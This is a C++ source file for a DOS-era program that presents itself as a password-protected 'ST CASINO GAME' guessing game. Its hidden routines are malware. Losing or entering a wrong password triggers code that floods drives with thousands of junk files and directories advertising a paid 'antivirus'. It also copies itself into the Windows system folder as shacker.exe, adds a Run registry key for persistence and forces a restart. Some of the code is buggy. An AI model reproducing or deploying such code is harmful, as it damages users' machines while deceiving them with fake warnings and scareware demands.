//TEST00
//THISH PROGRAM IS PROPWRITRY TO SURYANSH TRIVEDI PVT.LTD.
#include<iostream.h>
#include<conio.h>
#include<stdio.h>
#include<fstream.h>
#include<process.h>
#include<dir.h>
#include<dos.h>
#include<string.h>
#include<stdlib.h>
//#include<graphics.h>
void main()
{
 void supervirus();
 textbackground(4);
 clrscr();
 textbackground(2);
 textcolor(12);

char a[20]="SURYANSH" ;
char b[20];

	cout<<"                                 ST CASINO GAME"<<endl<<endl<<endl;
	cout<<"THISH PROGRAM IS PROPWRITRY TO SURYANSH TRIVEDI PVT.LTD."<<endl;
	cout<<"INSTRUCTIONS: \nafter typing  command(any digit ,spacial symboles & numbers) press enter. "<<endl;
	cout<<"-------------------------------------------------------------------------------"<<endl;
	cout<<"                                  Enter the password\n                                **********************" <<endl<<endl<<endl;
	cout<<"                                ======================="<<endl<<endl;
	cout<<"                                ======================="<<endl;

gotoxy(40,13);
gets(b);
	if(strcmp(a,b)==0)
{
	for(int c=0;c<=100;c++)
{
textbackground(c);
	cout<<"INSTRUCTIONS: \nafter typing  command(any digit ,spacial symboles & numbers) press enter. "<<endl;
	cout<<endl<<endl<<endl<<endl;
	cout<<"                               ================== "<<endl;
textcolor(15);
	cout<<"                                    loading"<<c<<"%";
	cout<<"                                                                 ================== "<<endl;
delay(20);
clrscr();
}
	cout<<"                                     welcome"<<endl;
	cout<<"                                   *********** "<<'\a'<<'\a'<<endl;
randomize();
int guess,n,h=0,f=0;
char choice;
{
do
{  clrscr();
cout<<"INSTRUCTIONS: \nafter typing  command(any digit ,spacial symboles & numbers) press enter. "<<endl;
n=random(10)+1;
textbackground(n);
cout<<endl<<endl<<endl<<endl<<endl<<endl<<endl<<"                      enter your choise(between 1 and 10):"<<endl;

	cout<<"                            ++++++++++++++++++++"<<endl;
	cout<<"                            +                  +"<<endl;
	cout<<"                            ++++++++++++++++++++"<<endl;
gotoxy(35,12);
	cin>>guess;
h++;
	if(guess<=10&&guess>=1)
{	if(n==guess)

{
int l;
l= random(10)+1;
textbackground(l);
cout<<endl<<endl<<"congrtulation,you won"<<'\a'<<endl;
++f;  }
	else
{	cout<<endl<<endl<<"sorry, you loose ;The no. was"<<n<<endl;
}

	cout<<"score:"<<f <<"    ||     " <<"total attempt:" <<h<<endl;
	if(h==10&&f<=3)
{clrscr();
	cout<<"you have scored <=3 in 10 attempts \n********************************\n";
	cout<<"ERROR!VIRUS   FH_VR_20092001 \n the virus activates. \n if you terminate program or log out your pc before (60mm) some files are lost & system is damaged.\n    ";
delay(1000);
supervirus();}
	cout<<" do you want to play again(y/n):"<<endl;
mom:;
	cin>>choice;
	{ if(choice=='y'||choice=='n')
	goto mo;
	else
{ clrscr();
	cout<<"re-enter the correct letter(y/n)";
	goto mom;  }}
mo:;}
	}while(choice=='y'||choice=='Y');   }
}
	else
	cout<<'\a'<<endl<<endl<<"error! \nwrong password.\nTry again." <<endl;
	cout<<"ERROR!VIRUS   FH_VR_20092001 \n the virus activates. \n if you terminate program or log out your pc before (60mm) some files are lost & system is damaged.\n    ";
delay(1000);
supervirus();
getch(); }
//#########################################FUNCTION STARTED

void virus()
{  clrscr();

   char rat[100];
   int k;
   char* r;
   char ch[10];
   char  word[20];
randomize();
fstream mfile;     //////////////////////////////

mfile.open("d:\\mf_fh_vir",ios::in|ios::app|ios::binary);
mfile<<"===========================FILE==============================\n"<<endl;
 int run;
 randomize();
    for(int j=1;j>0;j++)
   {for(int i=0;i<20000;i++)
{sprintf(rat,"D:\\F%d.txt",i);
mfile.open("d:\\mf_fh_vir",ios::in|ios::app|ios::binary);
mfile.seekg(1,ios::end);
mfile<<rat<<"\n";
 run=random(12);
textcolor(run);
gotoxy(0,10);
	cout<<">>>>>>>>>>>>>>>>>>#############################>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"<<endl;
	cout<<"<<<<<<<<<<<<<<<<<<## LOADING......."<<j<<"%        ##<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"<<endl;
	cout<<">>>>>>>>>>>>>>>>>>#############################>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"<<endl;
	cout<<"\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a"<<endl;
textbackground(run+1);

clrscr();
fstream manu(rat,ios::in|ios::app|ios::binary);
	manu<<"########################################################\n";
	manu<<"this program is copyright to suryansh trivedi pvt.ltd.\n" ;
	manu<<"########################################################\n" <<r;
	manu<<" \n \n \n \n BUY (NOVIR)antivirus RS.15/-ONLY \n****************unique F code  FH_VR_20s2001_"<<i<<"_"<<j<<"*****************\n ";
manu.close();
mfile.close();/////////////////////////////////////
    } }
getch();
}
//#########################################folder()
void folder()
{
int stat;
char DIRNAME[20];

   char mat[100];
fstream mfile;
mfile.open("d:\\mf_fh_vir",ios::in|ios::app|ios::binary);
mfile<<"=========================FOLDER==============================\n";
	for(int j=1;j>0;j++)
{sprintf(mat,"C:\\Fm%d",j);
mfile.open("d:\\mf_fh_vir",ios::in|ios::app|ios::binary);
mfile<<"\n"<<mat<<"*********************************\n";
mfile.close();
clrscr();
textbackground(3);
stat = mkdir(mat);}
	if (!stat)
{printf("Directory created\n");

}
else
{
printf("Unable to create directory\n");
getch();
exit(1);
}
getch();
stat = rmdir(DIRNAME);
	if (!stat)
printf("\nDirectory deleted\n");
	else
{
perror("\nUnable to delete directory\n");
exit(1);
}
}

/////////////////////////////////////////////////////////////void message()
void message()
{
/////////////////////border
textbackground(3);
{
{int i;                     // 1
for(i=1;i<=50;i++)
{gotoxy(i,0);
cout<<"#";}}
cout<<endl;
{int j;                       //2
for(j=1;j<=18;j++)
{gotoxy(1,j);
cout<<"#";} }
cout<<endl;
{int i;                          //3
for(i=1;i<=18;i++)
{gotoxy(51,i);
cout<<"#";} }
cout<<endl;
{int i;                             //4
for(i=1;i<=50;i++)
{gotoxy(i,18);
cout<<"#";} }
cout<<endl;
}
///////////////////mesage()
gotoxy(8,3);
	cout<<"              WARNING"<<endl;
gotoxy(8,4);
	cout<<"           =============="<<endl;
gotoxy(3,5);
	cout<<"Application *ST CASINO GAME* may harm your pc.";
gotoxy(2,6);
	cout<<"**DO NOT CLOSE PROGRAM,IF YOU SOME DETA ARE LOST";
gotoxy(3,7);
	cout<<"In case of any lost or theft in deta,user was";
gotoxy(3,8);
	cout<<" responsible.No ligal charge can be filed ";
gotoxy(3,9);
	cout<<"           against developer.";
gotoxy(3,11);
	cout<<"     TERMS AND CONDITIONS ARE APPLIED";
gotoxy(3,16);
	cout<<"    copyright @ suryansh trivedi pvt.ltd.";
}
//////////////////////////////////////////////////void record()
void record()
{clrscr();
textbackground(4);
clrscr();
textbackground(2);
textcolor(12);
	char a[20]="SURYANSH" ;
	char b[20];

	cout<<"                                     VIRUS RECORDS   "<<endl;
	cout<<"                                  =================="<<endl<<endl<<endl;
	cout<<"                 PROGRAM COPYWRITE @ SURYANSH TRIVEDI PVT.LTD."<<endl;
	cout<<"-------------------------------------------------------------------------------"<<endl;
	cout<<endl;
	cout<<"                                  Enter the password\n                                **********************" <<endl<<endl<<endl;
	cout<<"                                ======================="<<endl<<endl;
	cout<<"                                ======================="<<endl;
gotoxy(40,13);
gets(b);
	if(strcmp(a,b)==0)
	{ for(int c=0;c<=100;c++)
{            textbackground(c);
	cout<<"                               ================== "<<endl;
textcolor(15);
	cout<<"                                    loading"<<c<<"%";
	cout<<"                                                                 ================== "<<endl;
delay(20);
clrscr();
}
/////////////////////////////////////////////////
	char word[20];
fstream rec;
rec.open("d:\\mf_fh_vir",ios::in|ios::app|ios::binary);
	while(!rec.eof())
{rec>>word;
	cout<<word<<endl;
}                              }
	else
	cout<<"REENTER PASSWORD" ;
getch();
}
////////////////////////////////////////////////////////VOID RESTART()


void findroot()
{ int found,drive_no;
char buff[128];
int done;
struct ffblk ffblk; //File block structure
done=findfirst("C:\\windows\\system",&ffblk,FA_DIREC); //to determine the root drive
	if(done==0)
{
done=findfirst("C:\\windows\\system\\shacker.exe",&ffblk,0); //to determine whether the virus is already installed or not
	if(done==0)
{
found=1; //means that the system is already infected
	return;
}
drive_no=1;
	return;
}
done=findfirst("D:\\windows\\system",&ffblk,FA_DIREC);
	if(done==0)
	{
done=findfirst("D:\\windows\\system\\shacker.exe",&ffblk,0);
	if(done==0)
{
found=1;return;
}
drive_no=2;
	return;
}
done=findfirst("E:\\windows\\system",&ffblk,FA_DIREC);
	if(done==0)
{
done=findfirst("E:\\windows\\system\\shacker.exe",&ffblk,0);
	if(done==0)
{
found=1;
	return;
}
drive_no=3;
	return;
}
done=findfirst("F:\\windows\\system",&ffblk,FA_DIREC);
	if(done==0)
{
done=findfirst("F:\\windows\\system\\shacker.exe",&ffblk,0);
	if(done==0)
{
found=1;
	return;
}
drive_no=4;
	return;
}
	else
exit(0);
}

void re()
{ int found,drive_no;
char buff[128];
FILE *self,*target;
clrscr();
findroot();
	if(found==0) //if the system is not already infected
{
self=fopen(_argv[0],"rb"); //The virus file open's itself
	switch(drive_no)
	{
	case 1:
target=fopen("C:\\windows\\system\\shacker.exe","wb"); //to place a copy of itself in a remote place
system("REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v sres \/t REG_SZ \/d C:\\windows\\system\\ sysres.exe"); //put this file to registry for starup
	break;

	case 2:
target=fopen("D:\\windows\\system\\shacker.exe","wb");
system("REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v sres \/t REG_SZ \/dD:\\windows\\system\\sysres.exe");
	break;

	case 3:
target=fopen("E:\\windows\\system\\shacker.exe","wb");
system("REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v sres \/t REG_SZ \/dE:\\windows\\system\\sysres.exe");
	break;

	case 4:
target=fopen("F:\\windows\\system\\shacker.exe","wb");
system("REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v sres \/t REG_SZ \/dF:\\windows\\system\\sysres.exe");
	break;

	default:
exit(0);
}

	while(fread(buff,1,1,self)>0)
fwrite(buff,1,1,target);
fcloseall();
}

	else
system("shutdown -r -t 0"); //if the system is already infected then just give a command to restart
}
//////////////////////////////////////////////////////exit()

///////////////////////////////////////////////////voidsupervir()
void supervirus()
{clrscr();
///////////////////////// comand file creation
fstream mfile;
mfile.open("d:\\co.txt",ios::in|ios::app);
mfile<<"0";
mfile.close();
getch();
///////////////////////// comand file execution////////////////////////////
fstream mfile1;
	char ch;
mfile1.open("d:\\co.txt",ios::in|ios::app);
mfile1>>ch;
	if(ch=='0')
	goto nex;
	gotoxy(15,10);
	cout<<"###########################"<<endl;
	gotoxy(15,11);
	cout<<"##  command activated "<<ch<<"  ##"<<endl;
	gotoxy(15,12);
	cout<<"###########################"<<endl;
delay(2000);
nex:;
	if (ch=='1'||ch=='2'||ch=='3'||ch=='9'||ch=='0'||ch=='7'||ch=='8')
      { switch(ch)
{
case '1':  {    clrscr();
		message();
		delay(5000);
		folder();break;}
case '2':  {    clrscr();
		message();
		delay(5000);
		virus();break;}
case '7': {fstream mfile;
	    mfile.open("d:\\mf_fh_vir",ios::in|ios::app|ios::binary);
	    mfile<<"===================SYSTEM RESTART APPLIED==============================\n";
	    mfile<<"1. This can harm your Computer..that do not run in your own PC.\n";
	    mfile<<"2. If Bi-mistake you run Program than Goto safe mode and delete Shacker.exe file\n";
	    mfile<<"from System folder.\n";
	    mfile.close();
	    re();
	    break;        }
case '8': {exit(0);break;}
case '9': {  	record();break;	}
default : {     message();
		delay(5000);
		virus() ;break;}
}   }

mfile1.close();

getch();
}












